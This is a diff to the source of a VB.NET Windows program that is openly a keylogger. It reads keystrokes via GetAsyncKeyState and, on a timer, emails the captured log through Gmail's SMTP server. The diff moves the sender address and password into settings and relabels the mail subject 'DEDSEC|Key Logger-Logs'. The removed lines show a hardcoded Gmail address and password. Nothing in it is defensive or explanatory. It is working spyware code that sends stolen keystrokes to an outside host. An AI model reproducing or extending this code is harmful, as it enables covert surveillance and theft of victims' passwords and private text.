@@ -1,19 +1,22 @@
 ﻿Option Strict On
 Imports System.Net.Mail
 Public Class Form1
+    Dim mails As String = My.Settings.mail
+    Dim pass As String = "123"
+
     Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Long) As Integer
     Private Sub tmrEmail_Tick(sender As Object, e As EventArgs) Handles tmrEmail.Tick
         Try
             Dim smtpserver As New SmtpClient
             smtpserver.EnableSsl = True
             Dim mail As New MailMessage
-            smtpserver.Credentials = New Net.NetworkCredential("thepsnappz@gmail.com", "123123qwerty")
+            smtpserver.Credentials = New Net.NetworkCredential(mails, pass)
             smtpserver.Port = 587
             smtpserver.Host = "smtp.gmail.com"
             mail = New MailMessage
-            mail.From = New MailAddress("thepsnappz@gmail.com")
-            mail.To.Add("thepsnappz@gmail.com")
-            mail.Subject = ("New keylogger logs!")
+            mail.From = New MailAddress(mails)
+            mail.To.Add(mails)
+            mail.Subject = ("DEDSEC|Key Logger-Logs")
             mail.Body = txtLogs.Text
             smtpserver.Send(mail)
         Catch ex As Exception
